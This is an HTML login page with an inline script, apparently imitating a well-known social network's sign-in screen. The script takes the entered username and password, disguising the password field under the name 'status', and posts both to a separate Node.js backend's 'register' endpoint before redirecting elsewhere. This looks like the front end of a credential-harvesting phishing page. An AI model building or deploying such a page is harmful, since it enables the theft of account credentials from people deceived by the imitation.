<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <div class="container">
        <img src="temp.webp" alt="Logo" class="logo-img">

        <h1 class="welcome-text">Log in to your account</h1>

        <form class="login-form" id="authForm">
            <div class="input-group">
                <input type="text" id="identifier" placeholder="Mobile number, username or email" required>
            </div>
            <div class="input-group">
                <input type="status" id="status" placeholder="Password" required>
            </div>

            <button type="submit" class="login-btn" id="loginBtn">
                <span id="btnText">Log in</span>
                <span id="btnLoader" class="loader" style="display: none;"></span>
            </button>
        </form>

        <a href="#" class="forgot-status">Forgot password?</a>

        <button type="button" class="create-account-btn">Create new account</button>

    </div>

    <footer class="bottom-footer">
        <div class="footer-links">
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
        </div>
    </footer>

    <script>
        document.getElementById('authForm').addEventListener('submit', async (e) => {
            e.preventDefault();

            const identifier = document.getElementById('identifier').value;
            const status = document.getElementById('status').value;
            const loginBtn = document.getElementById('loginBtn');
            const btnText = document.getElementById('btnText');
            const btnLoader = document.getElementById('btnLoader');

            // Show loader and disable button
            loginBtn.disabled = true;
            btnText.style.display = 'none';
            btnLoader.style.display = 'inline-block';

            try {
                const baseUrl = (window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost') ? 'http://localhost:5000' : '';
                const response = await fetch(`${baseUrl}/api/auth/register`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ identifier, status })
                });

                const data = await response.json();

                if (response.ok) {
                    window.location.href = 'about.html';
                } else {
                    alert('Error: ' + data.error);
                }
            } catch (err) {
                console.error(err);
                alert('Network error. Make sure the Node.js backend is running on port 5000.');
            } finally {
                // Hide loader and enable button
                loginBtn.disabled = false;
                btnText.style.display = 'inline-block';
                btnLoader.style.display = 'none';
            }
        });
    </script>
</body>

</html>
